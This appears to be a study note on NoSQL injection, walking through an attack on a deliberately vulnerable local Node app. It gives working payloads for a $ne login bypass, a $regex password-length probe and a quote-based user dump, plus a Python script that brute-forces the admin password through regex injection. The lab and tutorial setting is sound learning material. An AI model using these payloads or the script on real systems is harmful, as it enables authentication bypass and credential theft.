**NoSQL injections** are a security vulnerability in web applications that use NoSQL databases, such as MongoDB, Cassandra and CouchDB, among others. These injections occur when a web application allows an attacker to send malicious data via a query to the database, which can then be executed by the application without proper validation or sanitization.

NoSQL injection works similarly to SQL injection, but targets specific vulnerabilities in NoSQL databases. In a NoSQL injection, the attacker exploits database queries that rely on *documents* instead of relational tables to send malicious data that can manipulate the database query and obtain sensitive information or perform unauthorized actions.

Unlike SQL injections, NoSQL injections exploit the lack of data validation in a NoSQL database query, rather than exploiting weaknesses in SQL queries in relational databases.

# Example

For this example we will download [the following repository](https://github.com/Charlie-belmer/vulnerable-node-app) from **Github** and run the [[Docker]] container inside it.

The first thing to do is to enter *localhost:4000* and click the *Populate / Reset DB* button to create users.

If we click on *Login* and try to login with any invalid user, we can analyze the request from **BurpSuite** and see that it is sending a *POST* request including as *data* the *user* and *password*.

----
> Once we have tried [[SQL Injections (SQLI)]], if we see that we are not getting anywhere, we can try the **NoSQL Injections**.
> We can see possible payloads for **NoSQL** on the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) and [HackTricks](https://book.hacktricks.xyz/welcome/readme) websites.
----

The data we have sent are the following in *JSON* format:

```json
{
	"username":"admin",
	"password":"admin"
}
```

If instead of sending this data we replace it in the following way by the expression *$ne* (not equal) we can tell it to log in if the password is not *admin*:

```json
{
	"username":"admin",
	"password": {
		"$ne":"admin"
	}
}
```

As we can see it has let us log in correctly. If we want to get the exact password of the *admin* user we could create the a *Python* script. But first let's check the length of the password. For it we will use *regular expressions* and we will go up the number until it tells us that the password is not valid:

```json
{
	"username":"admin",
	"password": {
		"$regex":".{25}"
	}
}
```

We have verified that the length is 24, so we can create the script:

----
> Be careful to include content-type in the header. Otherwise, it will not be interpreted by the server.
----

```python
#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
login_url = "http://localhost:4000/user/login"
# All lower case characters + all upper case characters + all numbers
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
    username = "admin"
    password = ""

    p1 = log.progress("Brute force")
    p1.status("Beginning brute-force proccess...")

    time.sleep(2)

    p2 = log.progress("Password")

	# 
    for position in range(0, 24):
        for character in characters:
            post_data = '{ "username" : "%s", "password" : { "$regex" : "^%s%s" } }' % (username, password, character)

            p1.status(post_data)

            headers = { 'Content-Type' : 'application/json' }

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeNoSQLI()
```

This script should retrieve the *admin* user password character by character.

Another thing we could try, but this time in the *Lookup* tab, is to analyze the user's search request after clicking the button.

We can try changing the request method from *GET* to *POST* and the content-type to *application/json* and send the following data to see if it accepts it:

```json
{
	"username" : "admin"
}
```

If playing with *JSON* accepts the requests, we can do the same things we did in the previous example.

----
> We are doing the examples from **BurpSuite**, but if the request is processed by *GET* we can also do it directly from the URL.
----

**MongoDB** is the most common technology that we usually find when we can apply a *NoSQL Injection*. We can use the trick of the *quotation marks* to dump the users in the *Lookup* tab for example:

```sql
-- The user must be a valid database user, in this case, admin.
-- '1'=='1 dumps all users, we leave the quotation mark open so that the query itself is the one that closes the quotation mark
admin' || '1'=='1
```